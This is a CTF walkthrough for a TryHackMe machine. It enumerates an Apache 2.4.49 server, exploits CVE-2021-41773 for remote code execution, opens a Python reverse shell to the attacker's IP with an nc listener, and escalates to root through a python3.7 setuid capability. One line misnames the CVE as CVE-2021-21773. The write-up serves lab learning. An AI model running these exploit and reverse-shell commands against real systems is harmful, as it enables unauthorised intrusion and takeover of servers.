---
title: Oh My Webserver
date: 2023-03-02 02:47:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [web, apache, CVE-2021-41773, linux, RCE, getcap]
published: true
---

## Enumeration

### nmap

Initial Scans

```shell
sudo nmap 10.10.200.169 -vvv -p- -T5
sudo nmap -p22,80 10.10.200.169 -vvv -sC -sV -O
```

Response

```shell
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
```

## Webserver

The server is running Apache2.4.49.

Using `searchsploit` we can find a possible CVE-2021-21773.

```shell
┌──(oskar㉿kali)-[~/Downloads]
└─$ searchsploit -m multiple/webapps/50383.sh
  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50383
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50383.sh
    Codes: CVE-2021-41773
 Verified: True
File Type: ASCII text
Copied to: /home/oskar/Downloads/50383.sh
```

### CVE-2021-41773 RCE

- `https://github.com/thehackersbrain/CVE-2021-41773`

```shell
python3 exploit.py -t ohmywebserver.thm 
--------------------------------------------------------
|                Apache2 2.4.49 - Exploit              |
--------------------------------------------------------
>>> whoami
daemon
```

can try to get a reverse shell

```shell
export RHOST="10.2.3.64";export RPORT=6999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```shell
nc -lvnp 6999
```

## User Privilege Escalation

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

Running `getcap -r / 2>/dev/null` shows that python3.7 has its capsetuid+ep. This mean we can use python to set our userid to root

```shell
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

And we have a root shell we can check /root/user.txt for the user flag.

## Root Privilege Escalation

have to come back to this later :(
